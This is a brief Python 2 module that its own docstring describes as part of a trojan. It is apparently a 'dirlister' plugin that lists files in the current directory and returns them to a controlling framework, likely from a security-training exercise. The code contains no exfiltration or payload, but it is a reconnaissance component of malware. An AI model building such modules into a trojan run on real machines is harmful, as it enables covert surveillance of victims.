# -*- coding: utf-8 -*-encoding
'''
List all modules in trojan's path.
'''
import os


def run(**args):
    '''
    Receive the args to complete different tasks.
    '''
    print "[*] In dirlister module."
    files = os.listdir(".")
    print str(args)

    return str(files)
